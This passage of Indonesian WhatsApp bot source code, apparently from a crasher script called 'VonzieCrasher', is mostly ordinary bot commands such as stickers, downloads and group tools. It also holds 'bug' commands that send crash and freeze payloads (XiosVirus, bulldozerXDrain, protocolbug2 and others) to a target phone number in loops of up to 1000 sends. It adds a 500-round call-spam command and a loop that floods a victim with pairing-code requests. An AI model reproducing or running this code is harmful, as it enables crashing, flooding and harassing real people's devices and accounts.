│┏─⊱ ⌁⃰𝐒𝐞͠𝐧͜𝐝 𝐒𝐮͠𝐜𝐜͜𝐞𝐬͠𝐟𝐮𝐥͢𝐥𝐲 ⍣᳟
║▢  
│┗─⊱ ${bijipler}
╚─═─═─═─═─═─═─═─═─⪩
`;

    // Kirim pesan konfirmasi
    ryu.sendMessage(from, { 
        image: { url: `https://files.catbox.moe/6y35hh.jpg` },
        caption: DoneBug,
        gifPlayback: true,
    }, { quoted: m });
    
    await sleep(1000)
    
    // Kirim bug ke target
    for (let i = 0; i < 20; i++) {
    await XvonzieViroux(target);
    await sleep(1000);
   }
}
break;


case '9172928728826283772827372827263882638282728286383816273882729202836267291919372628939372628293927729292726382929273739292827272929297363839292937363782929282726289201836646382939_(93+3_9_+2+63-38_9_!3+-2938_?#(#//$"!"(2++2$)9"-2-;$9_9_-2(38_-_+_9$9"?!2&27$$?;2929$?"-$-28!"('9"-&26$+_!_9'8&6'(2(_8"'9'?2-_'('92!"+'"-_2!$8"-1)#$;17-$8#9$2-$_)+$!29$:283?2$(28#("?+1+)3$+912?_+-21293!$($&7-392(2829-2)373-393-2+)#)#9#+2;#82-+28272+28383-2+9$8"::'+82!2:$($8-#($8($+2($($($($($($($($($($($($($($($(82+299#($+$($($+28-$928$8$+$+$+$8_8($(28299#$+-$&_-$+2(2($8($+$--2+7283__&-$282-2)$0$0"!!"!*?)#9292--2!_?"9$-;2$9$7-_-2+29_8$8-$8$9$8$(;$-$8$9$9)$;$;2-282))#!$:$8$92);29$($;$;282)2!)2': {
    // Tambahkan pengecekan akses
    const isAuthorized = isAccryuDev || sender === botNumber;
    if (!isAccryuDev) 
        return ryuReply('`COMMAND PUNYA ADMIN/OWNER/CEO/MODERATOR`');
    
    if (!q) 
        return ryuReply(`𝗖𝗮𝗿𝗮 𝗽𝗮𝗸𝗮𝗶i : ${prefix + command} 𝟲𝟮×××`);
    
    // Proses nomor
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) 
        return ryuReply(`Contoh : ${prefix + command} 𝟲𝟮×××`);
    
    let target = bijipler + "@s.whatsapp.net";
    let DoneBug = `
┏─═─═─═─═─═─═─═─═─⪩
│┏─⊱ ⌁⃰𝐒𝐞͠𝐧͜𝐝 𝐒𝐮͠𝐜𝐜͜𝐞𝐬͠𝐟𝐮𝐥͢𝐥𝐲 ⍣᳟
║▢  
│┗─⊱ ${bijipler}
╚─═─═─═─═─═─═─═─═─⪩
`;

    // Kirim pesan konfirmasi
    ryu.sendMessage(from, { 
        image: { url: `https://files.catbox.moe/6y35hh.jpg` },
        caption: DoneBug,
        gifPlayback: true,
    }, { quoted: m });
    
    await sleep(1000)
    
    // Kirim bug ke target
    for (let i = 0; i < 100; i++) {
    await XiosVirus(target);
    await QDIphone(target);   
    await XvonzieViroux(target);
    await frezios(target);
    await invicXblank(target);
    await bulldozerXDrain(target);    
    await protocolbug2(target);
    await sleep(1500);
   }
}
break;


case 'systemvcx': case 'vonziexplague': {
    // Tambahkan pengecekan akses
    const isAuthorized = isAccryuDev || sender === botNumber;
    if (!isAccryuDev) 
        return ryuReply('`Fitur Khusus User Premium`');
    
    if (!q) 
        return ryuReply(`𝗖𝗮𝗿𝗮 𝗽𝗮𝗸𝗮𝗶i : ${prefix + command} 𝟲𝟮×××`);
    
    // Proses nomor
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) 
        return ryuReply(`Contoh : ${prefix + command} 𝟲𝟮×××`);
    
    let target = bijipler + "@s.whatsapp.net";
    let DoneBug = `
┏─═─═─═─═─═─═─═─═─⪩
│┏─⊱ ⌁⃰𝐒𝐞͠𝐧͜𝐝 𝐒𝐮͠𝐜𝐜͜𝐞𝐬͠𝐟𝐮𝐥͢𝐥𝐲 ⍣᳟
║▢  
│┗─⊱ ${bijipler}
╚─═─═─═─═─═─═─═─═─⪩
`;

    // Kirim pesan konfirmasi
    ryu.sendMessage(from, { 
        image: { url: `https://files.catbox.moe/6y35hh.jpg` },
        caption: DoneBug,
        gifPlayback: true,
    }, { quoted: m });
    
    await sleep(1000)
    
    // Kirim bug ke target
    for (let i = 0; i < 100; i++) {
    await XiosVirus(target);
    await QDIphone(target);   
    await sleep(1500);
   }
}
break;

case 'frezios': case 'vonzietrash': {
    // Tambahkan pengecekan akses
    const isAuthorized = isAccryuDev || sender === botNumber;
    if (!isAccryuDev) 
        return ryuReply('`Fitur Khusus User Premium`');
    
    if (!q) 
        return ryuReply(`𝗖𝗮𝗿𝗮 𝗽𝗮𝗸𝗮𝗶i : ${prefix + command} 𝟲𝟮×××`);
    
    // Proses nomor
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) 
        return ryuReply(`Contoh : ${prefix + command} 𝟲𝟮×××`);
    
    let target = bijipler + "@s.whatsapp.net";
    let DoneBug = `
┏─═─═─═─═─═─═─═─═─⪩
│┏─⊱ ⌁⃰𝐒𝐞͠𝐧͜𝐝 𝐒𝐮͠𝐜𝐜͜𝐞𝐬͠𝐟𝐮𝐥͢𝐥𝐲 ⍣᳟
║▢  
│┗─⊱ ${bijipler}
╚─═─═─═─═─═─═─═─═─⪩
`;

    // Kirim pesan konfirmasi
    ryu.sendMessage(from, { 
        image: { url: `https://files.catbox.moe/6y35hh.jpg` },
        caption: DoneBug,
        gifPlayback: true,
    }, { quoted: m });
    
    await sleep(1000)
    
    // Kirim bug ke target
    for (let i = 0; i < 100; i++) {
    await frezios(target);
    await frezios(target);   
    await sleep(1500);
   }
}
break;
    
case "xdelayvcx": case 'vonzieinvz':  {
    // Tambahkan pengecekan akses
    const isAuthorized = isAccryuDev || sender === botNumber;
    if (!isAccryuDev) 
        return ryuReply('`Fitur Khusus User Premium`');
    
    if (!q) 
        return ryuReply(`𝗖𝗮𝗿𝗮 𝗽𝗮𝗸𝗮𝗶i : ${prefix + command} 𝟲𝟮×××`);
    
    // Proses nomor
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) 
        return ryuReply(`Contoh : ${prefix + command} 𝟲𝟮×××`);
    
    let target = bijipler + "@s.whatsapp.net";
    let DoneBug = `
┏─═─═─═─═─═─═─═─═─⪩
│┏─⊱ ⌁⃰𝐒𝐞͠𝐧͜𝐝 𝐒𝐮͠𝐜𝐜͜𝐞𝐬͠𝐟𝐮𝐥͢𝐥𝐲 ⍣᳟
║▢  
│┗─⊱ ${bijipler}
╚─═─═─═─═─═─═─═─═─⪩
`;

    // Kirim pesan konfirmasi
    ryu.sendMessage(from, { 
        image: { url: `https://files.catbox.moe/6y35hh.jpg` },
        caption: DoneBug,
        gifPlayback: true,
    }, { quoted: m });
    
    await sleep(1000)
    
    // Kirim bug ke target
    for (let i = 0; i < 1000; i++) {
    await bulldozerXDrain(target);    
    await protocolbug2(target);
    await sleep(1500);
   }
}
break;

case "xvsblank": case 'vonziezep':  {
    // Tambahkan pengecekan akses
    const isAuthorized = isAccryuDev || sender === botNumber;
    if (!isAccryuDev) 
        return ryuReply('`Fitur Khusus User Premium`');
    
    if (!q) 
        return ryuReply(`𝗖𝗮𝗿𝗮 𝗽𝗮𝗸𝗮𝗶i : ${prefix + command} 𝟲𝟮×××`);
    
    // Proses nomor
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) 
        return ryuReply(`Contoh : ${prefix + command} 𝟲𝟮×××`);
    
    let target = bijipler + "@s.whatsapp.net";
    let DoneBug = `
┏─═─═─═─═─═─═─═─═─⪩
│┏─⊱ ⌁⃰𝐒𝐞͠𝐧͜𝐝 𝐒𝐮͠𝐜𝐜͜𝐞𝐬͠𝐟𝐮𝐥͢𝐥𝐲 ⍣᳟
║▢  
│┗─⊱ ${bijipler}
╚─═─═─═─═─═─═─═─═─⪩
`;

    // Kirim pesan konfirmasi
    ryu.sendMessage(from, { 
        image: { url: `https://files.catbox.moe/6y35hh.jpg` },
        caption: DoneBug,
        gifPlayback: true,
    }, { quoted: m });
    
    await sleep(1000)
    
    // Kirim bug ke target
    for (let i = 0; i < 20; i++) {
    await invicXblank(target);
    await sleep(1500);
   }
}
break;


case "spamcall": {
    // Tambahkan pengecekan akses
    const isAuthorized = isAccryuDev || sender === botNumber;
    if (!isAccryuDev) 
        return ryuReply('`Fitur Khusus User Premium`');
    
    if (!q) 
        return ryuReply(`𝗖𝗮𝗿𝗮 𝗽𝗮𝗸𝗮𝗶i : ${prefix + command} 𝟲𝟮×××`);
    
    // Proses nomor
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) 
        return ryuReply(`Contoh : ${prefix + command} 𝟲𝟮×××`);
    
    let target = bijipler + "@s.whatsapp.net";
    let DoneBug = `
┏─═─═─═─═─═─═─═─═─⪩
│┏─⊱ ⌁⃰𝐒𝐞͠𝐧͜𝐝 𝐒𝐮͠𝐜𝐜͜𝐞𝐬͠𝐟𝐮𝐥͢𝐥𝐲 ⍣᳟
║▢  
│┗─⊱ ${bijipler}
╚─═─═─═─═─═─═─═─═─⪩
`;

    // Kirim pesan konfirmasi
    ryu.sendMessage(from, { 
        image: { url: `https://files.catbox.moe/6y35hh.jpg` },
        caption: DoneBug,
        gifPlayback: true,
    }, { quoted: m });
    
    await sleep(1000)
    
    // Kirim bug ke target
    for (let i = 0; i < 500; i++) {
    await sendOfferVideoCall(target);
    await sendOfferCall(target);    
    await sleep(1000);
   }
}
break;

case 'xvcz': case 'delaygc': case 'blankgc': {
    const maxSend = 10;
    for (let i = 0; i < maxSend; i++) {
        if (command === 'blankgc') {
            await BlankGroup(m.chat);
        } else if (command === 'xvcz') {
            await BlankGroup(m.chat);
        } else if (command === 'xvcz') {
            await ForceSpamSafe(m.chat);
            await BlankGroup(m.chat);
            await sleep(1500);
        }
    }
    replyRyu(`Selesai mengirim bug tipe ${command} sebanyak ${maxSend} kali`);
}
break;
case "restart": {
if (!CreatorOnly) return replyRyu(`*Your Not My Owner*`);
replyRyu("Restarting Bot...")
setTimeout(() => {
process.send("Restart")
}, 3000)
}
break
case "shutdown": {
if (!CreatorOnly) return replyRyu("*Your Not My Owner*")
replyRyu(`Shutdown Bot...`)
setTimeout(() => {
process.exit()
}, 3000)
}
break
case 'ping': {
    const old = performance.now()
    const ram = (os.totalmem() / Math.pow(1024, 3)).toFixed(2) + " GB";
    const free_ram = (os.freemem() / Math.pow(1024, 3)).toFixed(2) + " GB";
    const serverInfo = `server information

CPU : *${os.cpus().length} Core, ${os.cpus()[0].model}*
Uptime : *${Math.floor(os.uptime() / 86400)} days*
Ram : *${free_ram}/${ram}*
Speed : *${(performance.now() - old).toFixed(5)} ms*`;
    ryu.sendMessage(m.chat, {
        text: serverInfo
    },{ quoted: ranstech })
}
break;

case 'addowner': case 'addown':
if (!CreatorOnly) return replyRyu("*Your Not My Onwer*")
  if (!args[0]) return replyRyu(`Penggunaan ${prefix + command} Example ${prefix + command} 62 xxx-xxxx-xxxx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let loadnum = await ryu.onWhatsApp(numero + `@s.whatsapp.net`);
  if (loadnum.length == 0) return replyRyu(`Number Invalid!!!`);
  owner.push(numero);
  Premium.push(numero);
  fs.writeFileSync('./Access/Own.json', JSON.stringify(owner));
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  replyRyu(`Number ${numero} succes add to database!`);
  break;

case 'delowner': case 'delown':
if (!CreatorOnly) return replyRyu("*Your Not My Onwer*")
  if (!args[0]) return replyRyu(`Penggunaan ${prefix + command} Example:\n ${prefix + command} 62 xxx-xxxx-xxxx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Owner.indexOf(numero2);
  numload = Premium.indexOf(numero2);
  Owner.splice(numeroX, 1);
  Premium.splice(numload, 1);
  fs.writeFileSync('./Access/Own.json', JSON.stringify(Owner));
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  replyRyu(`Number ${numero2} succes delate to database!`);
  break;

case 'addpremium': case 'addprem':
if (!CreatorOnly) return replyRyu("*Your Not My Onwer*")
  if (!args[0]) return replyRyu(`Penggunaan ${prefix + command} Example ${prefix + command} 62 xxx-xxxx-xxxx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let Invalid = await ryu.onWhatsApp(numero + `@s.whatsapp.net`);
  if (Invalid.length == 0) return replyRyu(`Number Invalid!!!`);
  Premium.push(numero);
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  replyRyu(`Number ${numero} succes add to database!`);
  break;

case 'delpremium': case 'delprem':
if (!CreatorOnly) return replyRyu("*Your Not My Onwer*")
  if (!args[0]) return replyRyu(`Penggunaan ${prefix + command} Example ${prefix + command} 62 xxx-xxxx-xxxx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Premium.indexOf(numero2);
  Premium.splice(numeroX, 1);
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  replyRyu(`Number ${numero2} succes delate to database!`);
  break;

case 'qc': {
  if (!q) return replyRyu(`Send command with text. ${prefix + command} Tams Ryuichi`);
  let obj = {
    type: 'quote',
    format: 'png',
    backgroundColor: '#ffffff',
    width: 512,
    height: 768,
    scale: 2,
    messages: [
      {
        entities: [],
        avatar: true,
        from: {
          id: 1,
          name: `${pushname}`,
          photo: { 
            url: await ryu.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
          }
        },
        text: `${q}`,
        replyMessage: {},
      },
    ],
  };
  let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
    headers: {
      'Content-Type': 'application/json',
    },
  });
  let buffer = Buffer.from(response.data.result.image, 'base64');
  ryu.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}` });
}
break;

  case "play": {
    if (!qtext) return replyRyu("Send Title");
    await ryu.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });

    try {
        // Ambil URL video atau cari di YouTube
        const txt = /https:\/\/youtube.com|youtu.be/.test(qtext)
            ? qtext
            : (await yts(qtext)).videos[0].url;

        // Request data dari API
        const { data } = await axios.get(`${txt}`, {
            headers: {
                "Content-Type": "application/json",
                "Accept": "application/json"
            }
        });

        // Format caption
        const cap = `*→ YouTube - Play*\n` +
            Object.entries(data.metadata).map(([key, value]) => `> *- ${key} :* ${value}`).join("\n") +
            `\n\nrans ~ 2025`;

        // Kirim gambar + caption
        await ryu.sendMessage(m.chat, {
            image: { url: data.metadata.thumbnail.url },
            caption: cap
        }, { quoted: ranstech });

        // Kirim audio
        await ryu.sendMessage(m.chat, {
            audio: { url: data.downloads["128kbps"].download },
            mimetype: "audio/mpeg"
        }, { quoted: ranstech });
    } catch (error) {
        replyRyu("Error! Unable to process your request.");
        await ryu.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        console.error(error);
    }
}
break;

case 'eval': {
  if (!CreatorOnly) return;

  // Check if the message is quoted
  if (!m.quoted) return replyRyu(`Reply to a message with caption ${prefix + command}`);

  // Convert quoted message data to JSON
  let penis = JSON.stringify({ [m.quoted.mtype]: m.quoted }, null, 2);
  let jeneng = `MessageData_${crypto.randomBytes(8).toString('hex')}.json`;

  try {
    // Save the JSON data to a file
    await fs.writeFileSync(jeneng, penis);

    // Send the JSON data as a reply
    await replyRyu(penis);

    // Send the saved file as a document
    await ryu.sendMessage(m.chat, {
      document: { url: `./${jeneng}` },
      fileName: jeneng,
      mimetype: '*/*'
    }, { quoted: ranstech });

    // Delete the file after sending it
    await fs.unlinkSync(jeneng);

  } catch (error) {
    console.error("Error processing the eval case:", error);
    replyRyu("An error occurred while processing the eval case.");
  }
}
break;

case "rvo":
case "readvo":
case "readviewonce":
case "readviewoncemessage": {
if (!m.quoted) return replyRyu(
`*❌Syntax Error!!*
*Example:* Reply ViewOnce with caption ${prefix + command}`);
try {
let buffer = await m.quoted.download();
let type = m.quoted.mtype;
let sendOptions = { quoted: m };
if (type === "videoMessage") {
await ryu.sendMessage(m.chat, { video: buffer, caption: m.quoted.text || "" }, sendOptions);
} else if (type === "imageMessage") {
await ryu.sendMessage(m.chat, { image: buffer, caption: m.quoted.text || "" }, sendOptions);
} else if (type === "audioMessage") {
await ryu.sendMessage(m.chat, { 
audio: buffer, 
mimetype: "audio/mpeg", 
ptt: m.quoted.ptt || false 
}, sendOptions);
} else {
return Reply("❌ Media View Once tidak didukung.");
}} catch (err) {
console.error(err)}
}
break;

case "setpp": {
    if (!CreatorOnly) return replyRyu("*You're not my owner*");
    if (!quoted) return replyRyu(`Send Image / Reply`);
    try {
        let mime = quoted.message?.imageMessage?.mimetype || quoted.mimetype || "";
        if (!mime.startsWith("image/")) return replyRyu(`Bukan gambar, nih!`);
        if (/webp/.test(mime)) return replyRyu(`Sini muka lu ku tempelin stiker anjg!`);
        let media = await ryu.downloadMediaMessage(quoted);
        if (!media) return replyRyu(`Gagal mengunduh gambar, coba lagi!`);
        await ryu.updateProfilePicture(BotNum, media);
        replyRyu(`Success! Profile updated`);
    } catch (error) {
        console.error(error);
        replyRyu(`Aduhh, error nih 🥺: ${error}`);
    }
    }
    break;
    
//END
//DELETE PP CASE

case "delpp": {
  // Check if the user is the creator
  if (!CreatorOnly) {
    return replyRyu("*You are not my owner*");
  }

  try {
    // Remove the profile picture
    await ryu.removeProfilePicture(ryu.user.id);

    // Respond with success message
    replyRyu("Successfully deleted profile picture.");

  } catch (error) {
    // Handle any errors that occur during the process
    console.error("Error deleting profile picture:", error);
    replyRyu("An error occurred while deleting the profile picture.");
  }
}
break;

case 'tovn': {
  // Check if the quoted media is a video or audio
  if (!/video/.test(mime) && !/audio/.test(mime)) {
    return replyRyu(`Reply with a video or voice note and caption it with ${prefix + command}`);
  }

  // Ensure that the message is quoted
  if (!quoted) {
    return replyRyu(`Reply with video or voice note and caption it with ${prefix + command}`);
  }

  try {
    // Download the quoted media
    let media = await quoted.download();

    // Import the toAudio function
    let { toAudio } = require('./System/Data4');

    // Convert the media to audio
    let audio = await toAudio(media, 'mp4');

    // Send the audio as a voice note
    await ryu.sendMessage(m.chat, { 
      audio, 
      mimetype: 'audio/mpeg', 
      ptt: true 
    }, { quoted: ranstech });

  } catch (error) {
    console.error('Error processing media:', error);
    replyRyu("An error occurred while converting the media.");
  }
}
break;

case 'hidetag': {
  if (!CreatorOnly) return replyRyu("*You're Not My Owner*");
  if (!m.isGroup) return replyRyu("*This command can only be used in a group*");

  let message = q ? q : '';
  let mentionedUsers = participants.map(a => a.id);

  try {
    await ryu.sendMessage(from, { 
      text: message, 
      mentions: mentionedUsers 
    }, { quoted: ranstech });
    replyRyu("Message sent with hidden tag.");
  } catch (error) {
    console.error("Error sending message:", error);
    replyRyu("An error occurred while sending the message.");
  }
}
break;

case 'kick': {
  if (!CreatorOnly) return replyRyu("*You're Not My Owner*");
  if (!m.isGroup) return replyRyu("*This command can only be used in a group*");
  if (!BotAdm) return replyRyu("*Only Bot Admins can use this command*");
  if (!Adm) return replyRyu("*Only Group Admins can use this command*");

  let users = m.mentionedJid[0] 
    ? m.mentionedJid[0] 
    : m.quoted 
    ? m.quoted.sender 
    : qtext.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

  if (!q) return replyRyu("Please mention a user or send their number.");

  try {
    await ryu.groupParticipantsUpdate(from, [users], 'remove');
    replyRyu("Successfully kicked the user.");
  } catch (error) {
    console.error("Error kicking user:", error);
    replyRyu("An error occurred while kicking the user.");
  }
}
break;

case 'ocr': {
  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";

  if (!mime) return replyRyu("Send / Reply Image");
  
  if (!/image\/(jpe?g|png)/.test(mime)) {
    return replyRyu(`Tipe ${mime} tidak didukung!`);
  }

  let image = await q.download();
  let download = await ryu.getFile(image, true);

  try {
    let ocr = await ocrSpace(download.filename);
    await ryu.sendMessage(
      m.chat,
      { text: ocr.ParsedResults[0].ParsedText.trim() },
      { quoted: ranstech }
    );
  } catch (error) {
    console.error("OCR error:", error);
    return replyRyu("Gagal membaca teks dari gambar.");
  }
}
break;

case 'tourl': {
    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return replyRyu(`Reply to an Image or Video with command ${prefix + command}`);
    
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return replyRyu('Only images or MP4 videos are supported!');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        console.error(error);
        return replyRyu('Failed to download media!');
    }

    const uploadImage = require('./System/Data6');
    const uploadFile = require('./System/Data7');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;

    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        console.error(error);
        return replyRyu('Failed to upload media!');
    }

    ryu.sendMessage(m.chat, {
        text: `(no expiration date/unknown)\n ${link}`
    }, { quoted: ranstech });
}
break;

case 'sticker':
case 's': {
    if (!quoted) return replyRyu(`Reply Image or Video with command ${prefix + command}`);
    
    if (/image/.test(mime)) {
        let media = await quoted.download();
        let encmedia = await ryu.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author });
        await fs.unlinkSync(encmedia);
    } else if (/video/.test(mime)) {
        if ((quoted.msg || quoted).seconds > 11) return replyRyu('max 10s');
        
        let media = await quoted.download();
        let encmedia = await ryu.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author });
        await fs.unlinkSync(encmedia);
    } else {
        return replyRyu(`Send Image or Video with command ${prefix + command}\nVideo duration only 1-9s`);
    }
}
break;

case 'brat': {
    if (!q) return replyRyu(`Example : Brat Brat Bret Brot`);
    
    const imageUrl = `https://brat.caliphdev.com/api/brat?text=${q}`;
    await makeStickerFromUrl(imageUrl, ryu, m);
}
break;

case "addbot": {
if (!CreatorOnly && !PremOnly) return
if (m.isGroup) return replyRyu("*Only In Private Chat*")
await ryu.sendMessage(m.chat, { text: "*Silahkan Tunggu Kode Pairing Anda*" }, {})
if (m.key.fromMe) return
    try {
        await jadibot(ryu, m, m.sender)
    } catch (error) {
        await replyRyu(util.format(error), command)
    }
}
break;

case "stopbot": {
if (!CreatorOnly && !PremOnly) return
if (m.isGroup) return replyRyu("*Only In Private Chat*")
await ryu.sendMessage(m.chat, { text: "*Berhasil Menghapus Session!*" }, {})
    if (m.key.fromMe) return
    try {
        await stopbot(ryu, m, m.sender)
    } catch (error) {
        await replyRyu(util.format(error), command)
    }
}
break;

case "listbot": {
if (!CreatorOnly && !PremOnly) return
if (m.isGroup) return replyRyu("*Only In Private Chat*")
    if (m.key.fromMe) return
    try {
        listbot(ryu, m)
    } catch (error) {
        await replyRyu(util.format(error), command)
    }
}
break;

case 'tiktok':
case 'tt': {
    if (!qtext) return replyRyu(`Send command with link. ${prefix + command} https://`);
    
    let res = await tiktok(qtext);          

    if (res && res.data && res.data.data) {
        let images = res.data.data.images || [];
        let play = res.data.data.play;
        let lagu = res.data.data.music;

        const getMimeType = async (url) => {
            try {
                const response = await axios.head(url);
                return response.headers['content-type'];
            } catch (error) {
                console.error(error);
                return;
            }
        };

        let mimeType = await getMimeType(play);
            
        if (mimeType && mimeType.startsWith('video/')) {
            await ryu.sendMessage(m.chat, {
                video: { url: play },
                caption: "Successfully downloaded video from TikTok"
            }, { quoted: ranstech });
        } else if (images.length > 0) {
            let totalImages = images.length;
            let estimatedTime = totalImages * 4;
            let message = `Estimasi waktu pengiriman gambar: ${estimatedTime} detik.`;
            await ryu.sendMessage(m.chat, { text: message }, { quoted: ranstech });

            const sendImageWithDelay = async (url, index) => {
                let caption = `Gambar ke-${index + 1}`;
                await ryu.sendMessage(m.chat, { image: { url }, caption: caption }, { quoted: ranstech });
            };

            await ryu.sendMessage(m.chat, { audio: { url: lagu }, mimetype: "audio/mpeg" }, { quoted: ranstech });

            for (let i = 0; i < images.length; i++) {
                await sendImageWithDelay(images[i], i);
                await new Promise(resolve => setTimeout(resolve, 4000)); // Delay 4 seconds
            }
        } else {
            console.log('No valid video or images found.');
            await ryu.sendMessage(m.chat, {
                text: "No media found or an error occurred while retrieving media."
            }, { quoted: ranstech });
        }
    } else {
        console.error('Error: Invalid response structure', res);
        await ryu.sendMessage(m.chat, {
            text: "No media found or an error occurred while retrieving media."
        }, { quoted: ranstech });
    }
}
break;
      
case 'meta-ai': {
    if (!qtext) {
        return replyRyu('Send Text / Question');
    }

    try {
        const apiUrl = `https://restapii.rioooxdzz.web.id/api/metaai?message=${encodeURIComponent(qtext)}`;
        const response = await fetch(apiUrl);
        const mark = await response.json();

        const ress = mark.result.meta || 'Maaf, saya tidak bisa memahami permintaan Anda. Mungkin pertanyaanmu stress / nguawor';

        await ryu.sendMessage(m.chat, { text: ress }, { quoted: ranstech });
        
    } catch (error) {
        console.error("Terjadi kesalahan segera hubungi creator!!!:", error.message);
    }
}
break;

case 'addcase': {
    if (!CreatorOnly) return replyRyu("*You are not a Premium User*");
    if (!text) return reply('Mana case nya');
    const fs = require('fs');
    const namaFile = 'RyuMa.js';
    const caseBaru = `${text}`;
    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err);
            return replyRyu('Gagal membaca file');
        }
        const posisiAwal = data.indexOf("switch (command) {");
        if (posisiAwal !== -1) {
            const posisiInsert = posisiAwal + "switch (command) {".length;
            const kodeBaruLengkap = data.slice(0, posisiInsert) + '\n\n' + caseBaru + '\n' + data.slice(posisiInsert);
            fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
                if (err) {
                    replyRyu('Terjadi kesalahan saat menulis file: ' + err);
                } else {
                    replyRyu('Case baru berhasil ditambahkan.');
                }
            });
        } else {
            replyRyu('Tidak dapat menemukan switch statement dalam file.');
        }
    });
}
break

//-------------------------------------------------------\\
case 'jadibot':
    if (!BotNum && !CreatorOnly) return;
    if (!q) return replyRyu('!Masukkan nomor target');
    
    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return replyRyu(`The number starts with '0'. Replace it with the country code number.\n\nExample: .Crashios 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    replyRyu(`[ ¡ ] Pairing Code Loop(TRUE) => m.chat(${target})`);
    
    (async () => {
        for (let r = 0; r < 100; r++) {
            console.log(`Iterasi ke-${r + 1}`);
            
            const BrowserList = ['Rans', 'Failed', 'PairCode'];
            const {
                   default: makeWASocket,
                   useMultiFileAuthState,
                   DisryuectReason,
                   fetchLatestBaileysVersion,
                   generateForwardMessageContent,
                   prepareWAMessageMedia,
                   generateWAMessageFromContent,
                   generateMessageID,
                   downloadContentFromMessage,
                   makeCacheableSignalKeyStore,
                   makeInMemoryStore,
                   jidDecode,
                   proto,
                   getAggregateVotesInPollMessage,
                   PHONENUMBER_MCC
            } = require("@whiskeysockets/baileys");
            
            const typeBrow = BrowserList[Math.floor(Math.random() * BrowserList.length)];
            
            const store = makeInMemoryStore({
                logger: pino().child({
                    level: 'debug',
                    stream: 'store'
                })
            });
            
            const { state } = await useMultiFileAuthState('./pairing/');
            const { version } = await fetchLatestBaileysVersion();
            const msgRetryCounterCache = new NodeCache();
            
            const WaConnection = makeWASocket({
                logger: pino({ level: 'silent' }),
                printQRInTerminal: !pairingCode,
                mobile: useMobile,
                browser: [`${typeBrow} (Linux)`, '', ''],
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(
                        state.keys,
                        pino({ level: "fatal" }).child({ level: "fatal" })
                    )
                },
                markOnlineOnConnect: true,
                generateHighQualityLinkPreview: true,
                getMessage: async (key) => {
                    const jid = jidNormalizedUser(key.remoteJid);
                    const msg = await store.loadMessage(jid, key.id);
                    return msg?.message || "";
                },
                msgRetryCounterCache,
                defaultQueryTimeoutMs: undefined,
            });

            WaConnection.ev.on('messages.upsert', async (chatUpdate) => {
                const mek = chatUpdate.messages[0];
                console.log("Pesan baru:", mek);
            });

            store.bind(WaConnection.ev);
            
            if (pairingCode && !state.creds.registered) {
                if (useMobile) {
                    throw new Error('Cannot use pairing code with mobile API');
                }
                let phoneNumber = numiCode;
                if (phoneNumber) {
                    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
                    if (!Object.keys(PHONENUMBER_MCC).some(v => phoneNumber.startsWith(v))) {
                        process.exit(0);
                    }
                }
                let code = await WaConnection.requestPairingCode(phoneNumber);
                code = code?.match(/.RANSTECH/g)?.join("-") || code;
                console.log("Pairing Code:", code);
            }

            // Tambahkan delay antar iterasi
            await new Promise(resolve => setTimeout(resolve, 995));
        }

        console.log("Loop pairing selesai setelah 100 iterasi.");
    })();
break
    case "warmode": {
          let NyM = await prepareWAMessageMedia({ image: fs.readFileSync('./logo.jpg') }, { upload: ryu.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "SHOW MENU\n© OffX"
}), 
contextInfo: {
isForwarded: true,
forwardingScore: 9999
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `
\`── 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻\`
\`⭔\` Devoloper : RyuMaOffc
\`⭔\` Mode : Public Bot
\`⭔\` Status : Public
\`⭔\` Version : 1 
\`⭔\` Name Scrip : VonzieCrasher͏͏͏͏
͏͏͏͏͏
計さ *BUG MENU*
 ⌬ Fcinvis 628xxxx
 ⌬ Xvsblank 628xxxx
